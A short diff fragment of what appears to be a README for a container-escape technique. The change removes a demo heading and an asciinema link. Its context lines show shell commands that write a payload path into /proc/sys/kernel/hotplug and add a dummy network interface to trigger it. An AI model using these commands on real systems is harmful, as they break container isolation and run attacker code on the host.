@@ -35,7 +35,4 @@ echo "$host_path/tmp/payload.sh" > /proc/sys/kernel/hotplug
 ip link add dummy0 type dummy
 
 ```
-## Demo
-
-[![asciicast](https://asciinema.org/a/HPAA6MEJhK5xx7aOev0a5f0DV.svg)](https://asciinema.org/a/HPAA6MEJhK5xx7aOev0a5f0DV)
 
